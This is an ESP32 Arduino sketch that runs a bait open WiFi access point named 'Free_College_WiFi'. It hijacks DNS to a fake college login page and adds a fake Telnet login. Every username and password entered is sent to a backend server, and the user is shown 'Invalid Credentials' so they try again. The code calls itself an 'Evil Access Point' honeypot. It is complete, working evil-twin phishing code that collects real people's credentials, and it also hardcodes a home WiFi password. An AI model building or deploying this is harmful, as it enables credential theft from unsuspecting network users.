#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <HTTPClient.h>

// --- Configuration ---
const char *sta_ssid = "prasanna";       // Your actual home/backend network
const char *sta_pass = "Password";
// IMPORTANT: Change this IP to your laptop's IP on the same network
const char *backendURL = "http://10.77.11.36:3000/api/report";

// --- Captive Portal Settings ---
const char *ap_ssid = "Free_College_WiFi"; // The bait network

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
WebServer server(80);

// --- Telnet Honeypot (Port 23) ---
WiFiServer telnetServer(23);

String htmlPage = 
"<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">"
"<style>"
"body { font-family: Arial, sans-serif; background-color: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }"
".login-box { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; width: 300px; }"
"h2 { color: #333; }"
"p { color: #666; font-size: 14px; margin-bottom: 20px; }"
"input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }"
"button { background: #007bff; color: white; padding: 10px; width: 100%; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }"
"button:hover { background: #0056b3; }"
"</style></head><body>"
"<div class=\"login-box\">"
"<h2>College Network</h2>"
"<p>Please login to access free internet.</p>"
"<form action=\"/login\" method=\"POST\">"
"  <input type=\"text\" name=\"username\" placeholder=\"Student ID / Username\" required>"
"  <input type=\"password\" name=\"password\" placeholder=\"Password\" required>"
"  <button type=\"submit\">Connect</button>"
"</form>"
"</div></body></html>";

void reportAttack(String ip, String protocol, String uname, String pwd) {
  if (WiFi.status() == WL_CONNECTED) {
    HTTPClient http;
    http.begin(backendURL);
    http.addHeader("Content-Type", "application/json");

    String jsonPayload = "{\"node_id\":\"Node-1 (Captive+Telnet)\", \"ip\":\"" + ip + "\", \"protocol\":\"" + protocol +
                         "\", \"username\":\"" + uname + "\", \"password\":\"" + pwd + "\"}";

    int httpCode = http.POST(jsonPayload);
    if (httpCode > 0) {
      Serial.println("Reported to backend: " + String(httpCode));
    } else {
      Serial.println("Backend error: " + String(httpCode));
    }
    http.end();
  }
}

void setup() {
  Serial.begin(115200);

  // 1. Dual Mode: Station + Access Point
  WiFi.mode(WIFI_AP_STA);
  
  // 2. Connect to backend network
  Serial.print("Connecting to backend network");
  WiFi.begin(sta_ssid, sta_pass);
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  Serial.println("\nConnected to backend! IP: " + WiFi.localIP().toString());

  // 3. Start Evil Access Point
  WiFi.softAP(ap_ssid);
  delay(100);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  Serial.println("Captive Portal AP Started: " + String(ap_ssid));

  // 4. DNS Sinkhole - hijack all domains
  dnsServer.start(DNS_PORT, "*", apIP);

  // 5. HTTP Routes

  // Captive Portal login page
  server.on("/", HTTP_GET, []() {
    server.send(200, "text/html", htmlPage);
  });

  // Catch credentials from Captive Portal
  server.on("/login", HTTP_POST, []() {
    String user = server.arg("username");
    String pass = server.arg("password");
    String clientIP = server.client().remoteIP().toString();

    Serial.println("[Captive] Login from " + clientIP + " | User: " + user + " | Pass: " + pass);
    reportAttack(clientIP, "HTTP-Captive", user, pass);

    String alertPage = "<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">"
                       "<meta http-equiv=\"refresh\" content=\"2;url=/\">"
                       "<style>body{font-family:Arial,sans-serif;text-align:center;padding:50px;background:#f4f4f9;color:#333;}</style></head>"
                       "<body><div style=\"background:#fff;padding:20px;border-radius:8px;display:inline-block;box-shadow:0 0 10px rgba(0,0,0,0.1);\">"
                       "<h3 style=\"color:red;\">Invalid Credentials</h3><p>Redirecting... please try again.</p></div></body></html>";
    server.send(200, "text/html", alertPage);
  });

  // Hardware alarm endpoint
  server.on("/alarm", HTTP_POST, []() {
    Serial.println("ALARM TRIGGERED FOR NODE-1!");
    server.send(200, "application/json", "{\"success\":true}");
  });

  // Catch-all redirect for captive portal trigger
  server.onNotFound([]() {
    server.sendHeader("Location", String("http://") + apIP.toString(), true);
    server.send(302, "text/plain", "Redirecting to portal");
  });

  server.begin();
  Serial.println("HTTP server started on port 80.");

  // 6. Telnet Honeypot
  telnetServer.begin();
  Serial.println("Telnet server started on port 23.");

  Serial.println("\n=== NODE-1 READY: Captive Portal + Telnet ===");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  // Handle Telnet clients
  if (telnetServer.hasClient()) {
    WiFiClient telnetClient = telnetServer.available();
    if (telnetClient) {
      String clientIP = telnetClient.remoteIP().toString();
      Serial.println("[Telnet] Connection from " + clientIP);

      telnetClient.println("Embedded IoT Device v1.2");
      telnetClient.print("Username: ");

      long startTime = millis();
      String input = "";
      bool readingUser = true;
      String telnetUser = "";
      String telnetPass = "";

      while (telnetClient.connected() && millis() - startTime < 10000) {
        if (telnetClient.available()) {
          char c = telnetClient.read();
          if (c == '\n' || c == '\r') {
            if (readingUser) {
              telnetUser = input;
              input = "";
              readingUser = false;
              telnetClient.print("\r\nPassword: ");
            } else {
              telnetPass = input;
              reportAttack(clientIP, "Telnet", telnetUser, telnetPass);
              telnetClient.println("\r\nLogin Incorrect");
              delay(500);
              break;
            }
          } else {
            input += c;
          }
        }
      }
      telnetClient.stop();
      Serial.println("[Telnet] Disconnected attacker.");
    }
  }
}
